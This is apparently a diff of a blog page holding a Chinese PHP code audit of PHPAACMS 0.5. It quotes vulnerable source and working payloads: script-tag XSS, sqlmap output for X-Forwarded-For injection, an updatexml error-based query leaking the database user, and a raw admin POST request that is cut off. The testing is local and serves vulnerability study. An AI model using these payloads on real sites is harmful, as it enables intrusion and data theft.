-        <a href="/tags/mysql/">mysql</a><a href="/tags/报错注入/">报错注入</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2018/01/14/Phpaacms0.5-of-PHP-code-audit/"><span>PHP代码审计之PHPAACMS0.5</span></a></h3>
-    
-  
-  
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2018/01/14/Phpaacms0.5-of-PHP-code-audit/" rel="bookmark">
-        <time class="entry-date published" datetime="2018-01-14T03:50:55.000Z">
-          2018-01-14
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p><strong>0x00</strong></p>
-<p>这个cms是在一期周报里看到的，不过周报里是0.3版本的，而且是最简单的一个GET注入，所以响应上一篇审计ZZCMS时我在群里说过的豪言，像ZZCMS这样子的，给我来一打，我能打十个！（#斜眼笑。。。）</p>
-<p><strong>0x01</strong></p>
-<p>那我们根据他周报里出现的最简单的GET注入的位置，看看他是如何修复的。<br>show.php   1行 – 6行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">'global.php'</span>;</span><br><span class="line"></span><br><span class="line">$id = !<span class="keyword">empty</span>($id) ? intval($id) : <span class="number">0</span>;</span><br><span class="line">$arc = getArticleInfo($id);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到，他只把类型给强制给转换了，而不是用全局包含的形式去过滤，所以肯定会出现过滤不严的问题，从而导致肯定会会出现SQL注入。</p>
-<p>可以看到，他只把类型给强制给转换了，而不是用全局包含的形式去过滤，所以肯定会出现过滤不严的问题，从而导致肯定会会出现SQL注入。</p>
-<p><strong>0x02</strong></p>
-<p>search.php   21行  反射XSS</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;td align=<span class="string">"left"</span>&gt;搜索关键字：&lt;font style=<span class="string">"color:#F00"</span><span class="string">"&gt;&lt;?php echo $_GET['keywords'];?&gt;&lt;/font&gt;&lt;/td&gt;</span></span><br></pre></td></tr></table></figure>
-<p>这里其实是搜索框这里的，也是最近在测试一些站点最常见的漏洞，毕竟有这么一个，我这天的报告就算完成了一半了。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phpaaCMS/search.php?keywords=&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>0x03</strong></p>
-<p>按照常规思路继续来到后台留言板这里看下这里的代码。</p>
-<p>message.php   13行–40行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &apos;header.php&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;name&apos;]))&#123;</span><br><span class="line">    if(empty($_POST[&apos;name&apos;]))&#123;</span><br><span class="line">        exit (&quot;&lt;script&gt;alert(&apos;称呼为空！&apos;); window.history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">    &#125;elseif(empty($_POST[&apos;content&apos;]))&#123;</span><br><span class="line">        exit (&quot;&lt;script&gt;alert(&apos;内容不能为空！&apos;);window.history.go(-1);&lt;/script&gt;&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $record = array(</span><br><span class="line">            &apos;title&apos;         =&gt;$_POST [&apos;title&apos;],</span><br><span class="line">            &apos;name&apos;          =&gt;$_POST [&apos;name&apos;],</span><br><span class="line">            //&apos;sex&apos;         =&gt;$_POST [&apos;sex&apos;],</span><br><span class="line">            //&apos;qq&apos;          =&gt;$_POST [&apos;qq&apos;],</span><br><span class="line">            //&apos;phone&apos;       =&gt;$_POST [&apos;phone&apos;],</span><br><span class="line">            //&apos;email&apos;       =&gt;$_POST [&apos;email&apos;],</span><br><span class="line">            //&apos;address&apos;     =&gt;$_POST [&apos;address&apos;],</span><br><span class="line">            &apos;content&apos;       =&gt;$_POST [&apos;content&apos;],</span><br><span class="line">            &apos;ip&apos;            =&gt;get_client_ip(),</span><br><span class="line">            &apos;created_date&apos;  =&gt;date ( &quot;Y-m-d H:i:s&quot; )</span><br><span class="line">        );</span><br><span class="line">        $id = $db-&gt;save(&apos;phpaadb_message&apos;,$record);</span><br><span class="line">        if($id)&#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&apos;留言成功！管理员审核才能看到！&apos;)</span><br><span class="line">            window.location=&apos;message.php&apos;;&lt;/script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以看到，没有一丝丝过滤的就这么插进去了，但是还是得看后台页面进行了过滤没有才是可以的。</p>
-<p>/admin/message.php   146行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;font style=&quot;color:#009900&quot;&gt;</span><br><span class="line">&lt;?php echo $list[&apos;created_date&apos;];?&gt;</span><br><span class="line">&lt;/font&gt; &amp;nbsp;&amp;nbsp;</span><br><span class="line">&lt;font style=&quot;color:#0009CC&quot;&gt;</span><br><span class="line">    &lt;?php echo $list[&apos;name&apos;];?&gt;</span><br><span class="line">&lt;/font&gt; &amp;nbsp;&amp;nbsp;QQ：</span><br><span class="line">&lt;?php echo $list[&apos;qq&apos;];?&gt; &amp;nbsp;&amp;nbsp;Email：</span><br><span class="line">&lt;?php echo $list[&apos;email&apos;];?&gt; &amp;nbsp;&amp;nbsp;IP：</span><br><span class="line">&lt;?php echo $list[&apos;ip&apos;];?&gt;&lt;/t</span><br></pre></td></tr></table></figure>
-<p>通过查看，可以确认，储存XSS一枚，确认无疑。</p>
-<p><strong>0x04</strong></p>
-<p>接着上面那个留言板，我们可能没有仔细观察接受 来访IP那里，我们再来观察一下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;ip&apos; =&gt;get_client_ip(),</span><br></pre></td></tr></table></figure></p>
-<p>是不是有种很熟悉的感觉？那我们继续跟进下这个函数的位置看一下。</p>
-<p>/include/functions.php  12行 – 23行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_client_ip</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (getenv(<span class="string">"HTTP_CLIENT_IP"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_CLIENT_IP"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">       $ip = getenv(<span class="string">"HTTP_CLIENT_IP"</span>);</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">       $ip = getenv(<span class="string">"HTTP_X_FORWARDED_FOR"</span>);</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (getenv(<span class="string">"REMOTE_ADDR"</span>) &amp;&amp; strcasecmp(getenv(<span class="string">"REMOTE_ADDR"</span>), <span class="string">"unknown"</span>))</span><br><span class="line">       $ip = getenv(<span class="string">"REMOTE_ADDR"</span>);</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_SERVER[<span class="string">'REMOTE_ADDR'</span>] &amp;&amp; strcasecmp($_SERVER[<span class="string">'REMOTE_ADDR'</span>], <span class="string">"unknown"</span>))</span><br><span class="line">       $ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       $ip = <span class="string">"unknown"</span>;</span><br><span class="line">   <span class="keyword">return</span>($ip);</span><br></pre></td></tr></table></figure></p>
-<p>再看到这个函数，是不是和上篇ZZCMS好似兄弟一样？妥妥的一个 XFF 注入啊！那扔SQLmap里看一下结果把。<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Parameter: <span class="title">X</span>-<span class="title">Forwarded</span>-<span class="title">For</span> #1* ((<span class="title">custom</span>) <span class="title">HEADER</span>)</span></span><br><span class="line"><span class="function">    <span class="title">Type</span>: <span class="title">boolean</span>-<span class="title">based</span> <span class="title">blind</span></span></span><br><span class="line"><span class="function">    <span class="title">Title</span>: <span class="title">MySQL</span> <span class="title">RLIKE</span> <span class="title">boolean</span>-<span class="title">based</span> <span class="title">blind</span> - <span class="title">WHERE</span>, <span class="title">HAVING</span>, <span class="title">ORDER</span> <span class="title">BY</span> <span class="title">or</span> <span class="title">GROUP</span> <span class="title">BY</span> <span class="title">clause</span></span></span><br><span class="line"><span class="function">    <span class="title">Payload</span>: 0.0.0.0' <span class="title">RLIKE</span> (<span class="title">SELECT</span> (<span class="title">CASE</span> <span class="title">WHEN</span> (1926=1926) <span class="title">THEN</span> 0<span class="title">x302e302e302e30</span> <span class="title">ELSE</span> 0<span class="title">x28</span> <span class="title">END</span>)) <span class="title">AND</span> '<span class="title">cAur</span>'='<span class="title">cAur</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">Type</span>: <span class="title">error</span>-<span class="title">based</span></span></span><br><span class="line"><span class="function">    <span class="title">Title</span>: <span class="title">MySQL</span> &gt;= 5.5 <span class="title">OR</span> <span class="title">error</span>-<span class="title">based</span> - <span class="title">WHERE</span>, <span class="title">HAVING</span> <span class="title">clause</span> (<span class="title">BIGINT</span> <span class="title">UNSIGNED</span>)</span></span><br><span class="line"><span class="function">    <span class="title">Payload</span>: 0.0.0.0' <span class="title">OR</span> (<span class="title">SELECT</span> 2*(<span class="title">IF</span>((<span class="title">SELECT</span> * <span class="title">FROM</span> (<span class="title">SELECT</span> <span class="title">CONCAT</span>(0<span class="title">x7170627171</span>,(<span class="title">SELECT</span> (<span class="title">ELT</span>(4546=4546,1))),0<span class="title">x7162626b</span></span></span><br><span class="line"><span class="function">71,0<span class="title">x78</span>))<span class="title">s</span>), 8446744073709551610, 8446744073709551610))) <span class="title">AND</span> '<span class="title">dhus</span>'='<span class="title">dhus</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">Type</span>: <span class="title">AND</span>/<span class="title">OR</span> <span class="title">time</span>-<span class="title">based</span> <span class="title">blind</span></span></span><br><span class="line"><span class="function">    <span class="title">Title</span>: <span class="title">MySQL</span> &gt;= 5.0.12 <span class="title">OR</span> <span class="title">time</span>-<span class="title">based</span> <span class="title">blind</span></span></span><br><span class="line"><span class="function">    <span class="title">Payload</span>: 0.0.0.0' <span class="title">OR</span> <span class="title">SLEEP</span>(5) <span class="title">AND</span> '<span class="title">rtPK</span>'='<span class="title">rtPK</span></span></span><br></pre></td></tr></table></figure></p>
-<p>可以看到存在布尔盲注，时间盲注，还有报错注入。不过这里得提一个点，由于这是INSERT注入，所以请不要去用sqlmap去测试，因为这会造成很多的垃圾的测试数据，我曾统计过，sqlmap测试一个注入点，基本会输出120~140个payload数据来判断，所以都懂的。</p>
-<p><strong>0x05</strong></p>
-<p>额，上面忘了记录还有一个点，还是搜索框那里。</p>
-<p>/search.php  24行–29行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php foreach(getArticleList(&quot;cid=&quot;.$_GET[&apos;id&apos;].&quot;|keywords=&quot;.$_GET[&apos;keywords&apos;].&quot;|row=20&quot;) as $list)&#123;?&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td height=&quot;30&quot; align=&quot;left&quot;&gt;&lt;a href=&quot;show.php?id=&lt;?php echo $list[&apos;id&apos;]?&gt;&quot; target=&quot;_blank&quot;&gt;&lt;?php echo $list[&apos;title&apos;]?&gt;&lt;/a&gt;&amp;nbsp;&lt;/td&gt;</span><br><span class="line">&lt;td width=&quot;120&quot; align=&quot;left&quot;&gt;&lt;?php echo $list[&apos;pubdate&apos;]?&gt;&amp;nbsp;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;?php &#125;?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>这里只要跟进一下 getArticleList() 这个函数即可。</p>
-<p>/include/function.web.php  136行–206行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getArticleList</span><span class="params">($str=<span class="string">''</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    $page = !<span class="keyword">empty</span>($_REQUEST[<span class="string">'page'</span>]) ? intval($_REQUEST[<span class="string">'page'</span>]) : <span class="number">0</span>;</span><br><span class="line">    $curpage = <span class="keyword">empty</span>($page)?<span class="number">0</span>:($page<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//定义默认数据</span></span><br><span class="line">    $init_array =<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'row'</span>       =&gt;<span class="number">0</span>,</span><br><span class="line">        <span class="string">'titlelen'</span>  =&gt;<span class="number">0</span>,</span><br><span class="line">        <span class="string">'keywords'</span>  =&gt;<span class="number">0</span>,</span><br><span class="line">        <span class="string">'type'</span>      =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">'cid'</span>       =&gt;<span class="string">''</span>,</span><br><span class="line">        <span class="string">'order'</span>     =&gt;<span class="string">'id'</span>,</span><br><span class="line">        <span class="string">'orderway'</span>  =&gt;<span class="string">'desc'</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">//用获取的数据覆盖默认数据</span></span><br><span class="line">    $str_array = explode(<span class="string">'|'</span>,$str);</span><br><span class="line">    <span class="keyword">foreach</span>($str_array <span class="keyword">as</span> $_str_item)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_str_item))&#123;</span><br><span class="line">            $_str_item_array = explode(<span class="string">'='</span>,$_str_item);</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>($_str_item_array[<span class="number">0</span>])&amp;&amp;!<span class="keyword">empty</span>($_str_item_array[<span class="number">1</span>]))&#123;</span><br><span class="line">                $init_array[$_str_item_array[<span class="number">0</span>]]=$_str_item_array[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//定义要用到的变量</span></span><br><span class="line">    $row         = $init_array[<span class="string">'row'</span>];</span><br><span class="line">    $titlelen    = $init_array[<span class="string">'titlelen'</span>];</span><br><span class="line">    $keywords    = htmlspecialchars($init_array[<span class="string">'keywords'</span>]);</span><br><span class="line">    $type        = $init_array[<span class="string">'type'</span>];</span><br><span class="line">    $cid         = $init_array[<span class="string">'cid'</span>];</span><br><span class="line">    $order       = $init_array[<span class="string">'order'</span>];</span><br><span class="line">    $orderway    = $init_array[<span class="string">'orderway'</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//文章标题长度控制</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($titlelen))&#123;</span><br><span class="line">        $title=<span class="string">"substring(a.title,1,"</span>.$titlelen.<span class="string">") as title"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $title=<span class="string">"a.title"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据条件数据生成条件语句</span></span><br><span class="line">    $where = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($cid))&#123;</span><br><span class="line">        $where .= <span class="string">" and a.cid in ("</span>.$cid.<span class="string">")"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $id = !<span class="keyword">empty</span>($id) ? intval($id) : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($id))&#123;</span><br><span class="line">            $where .= <span class="string">" and a.cid in ("</span>.$id.<span class="string">")"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($type==<span class="string">'image'</span>)&#123;</span><br><span class="line">        $where .= <span class="string">" and a.pic is not null"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>($keywords))&#123;</span><br><span class="line">        $where .= <span class="string">" and a.title like '%"</span>.$keywords.<span class="string">"%' or a.content like '%"</span>.$keywords.<span class="string">"%'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $sql = <span class="string">"select </span></span><br><span class="line"><span class="string">    a.id,b.id as cid,"</span>.$title.<span class="string">",a.att,a.pic,a.source,</span></span><br><span class="line"><span class="string">    a.author,a.resume,a.pubdate,a.content,a.hits,a.created_by,a.created_date,</span></span><br><span class="line"><span class="string">    b.name</span></span><br><span class="line"><span class="string">    from phpaadb_article a </span></span><br><span class="line"><span class="string">    left outer join phpaadb_category b on a.cid=b.id</span></span><br><span class="line"><span class="string">    where a.delete_session_id is null "</span>.$where.<span class="string">" order by a."</span>.$order.<span class="string">" "</span>.$orderway;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">global</span> $pageList;</span><br><span class="line">    $pageList[<span class="string">'pagination_total_number'</span>]    = $db-&gt;getRowsNum($sql);</span><br><span class="line">    $pageList[<span class="string">'pagination_perpage'</span>]         = <span class="keyword">empty</span>($row)?$pageList[<span class="string">'pagination_total_number'</span>]:$row;</span><br><span class="line">    <span class="keyword">return</span> $db-&gt;selectLimit($sql,$pageList[<span class="string">'pagination_perpage'</span>],$curpage*$row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>函数较多，，懒的细解释，直接一个搜索型报错payload搞定。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search.php?keywords=111%&apos; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)) and &apos;%1%&apos;=&apos;%1</span><br></pre></td></tr></table></figure></p>
-<p>然后成功的出来root用户信息了。</p>
-<p>XPATH syntax error: ‘~root@localhost~’</p>
-<p><strong>0x06</strong></p>
-<p>page.php  4行–11行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$id = is_numeric($_GET[<span class="string">'id'</span>])?$_GET[<span class="string">'id'</span>]:<span class="number">0</span>;</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>]?$_GET[<span class="string">'code'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($id))&#123;</span><br><span class="line">    $page = getPageInfoById($id);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $page = getPageInfoByCode($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>这里挺有意思的，如果id存在就用上面的函数，如果不存在就接受下面的code参数，我们分别查看下每个函数的意思把。<br>在搜索第一个函数的时候，竟然没搜到，后来看到后，程序员犯了个小bug，就是把大写的ID在调用文件里写成小写了，怪不得我搜不到。</p>
-<p>/include/function.web.php </p>
-<p>68行–71行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageInfoByID</span><span class="params">($id=<span class="number">0</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    <span class="keyword">return</span> $db-&gt;find(<span class="string">"select * from phpaadb_page where id="</span>.$id);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>77行–80行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getPageInfoByCode</span><span class="params">($code)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    <span class="keyword">return</span> $db-&gt;find(<span class="string">"select * from phpaadb_page where code='"</span>.$code.<span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这不是妥妥的SQL注入啊，不解释。</p>
-<p><strong>0x07</strong></p>
-<p>额额，前台的差不多就这些了，再弄几个后台没毛用的SQL注入把？不能光前台把。</p>
-<p>/admin/category.action.php  16行 – 27 行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($act==<span class="string">'edit'</span>)&#123;</span><br><span class="line">    $pid = $_POST[<span class="string">'pid'</span>];</span><br><span class="line">    $id  = $_POST[<span class="string">'cid'</span>];</span><br><span class="line">    $record = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'pid'</span>       =&gt;$_POST [<span class="string">'pid'</span>],</span><br><span class="line">        <span class="string">'name'</span>      =&gt;$_POST [<span class="string">'name'</span>],      </span><br><span class="line">        <span class="string">'seq'</span>       =&gt;$_POST [<span class="string">'seq'</span>],</span><br><span class="line">        <span class="string">'description'</span>=&gt;$_POST[<span class="string">'description'</span>]</span><br><span class="line">    );</span><br><span class="line">    $db-&gt;update(<span class="string">'phpaadb_category'</span>,$record,<span class="string">'id='</span>.$id);</span><br><span class="line">    header(<span class="string">"Location: category.php"</span>);</span><br></pre></td></tr></table></figure></p>
-<p>这里关键的函数在于act，为什么说关键了，如果没有这个，就不存在接下来的判断。<br>然后我们继续看下这个update这个函数。</p>
-<p>/include/mysql.class.php     91行 – 107 行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $field_values, $where = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    $field_names = <span class="keyword">$this</span>-&gt;getCol ( <span class="string">'DESC '</span> . $table );</span><br><span class="line">    $sets = <span class="keyword">array</span> ();</span><br><span class="line">    <span class="keyword">foreach</span> ( $field_names <span class="keyword">as</span> $value ) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists ( $value, $field_values ) == <span class="keyword">true</span>) &#123;</span><br><span class="line">            $sets [] = $value . <span class="string">" = '"</span> . $field_values [$value] . <span class="string">"'"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span> ( $sets )) &#123;</span><br><span class="line">        $sql = <span class="string">'UPDATE '</span> . $table . <span class="string">' SET '</span> . implode ( <span class="string">', '</span>, $sets ) . <span class="string">' WHERE '</span> . $where;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($sql) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;query ( $sql );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>这里也不解释了，妥妥的后台注入就行了，直接上数据库吧。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /phpaaCMS/admin/category.action.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">54.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">54.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 125</span></span><br><span class="line"><span class="comment">Referer: http://127.0.0.1/phpaaCMS/admin/category.add.php?act=edit&amp;id=1</span></span><br><span class="line"><span class="comment">Cookie: username=admin; lastURL=http%3A%2F%2F127.0.0.1%2FphpaaCMS%2Fadmin%2Findex.php; bdshare_firstime=1504239219561; security_level=0; UserName=shiyan; PassWord=a346d5941b532654bf137e520cfa3ac0; PHPSESSID=pmh98lmalibbjlrkild42cft07</span></span><br><span class="line"><span class="comment">X-Forwarded-For: 0.0.0.0</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span 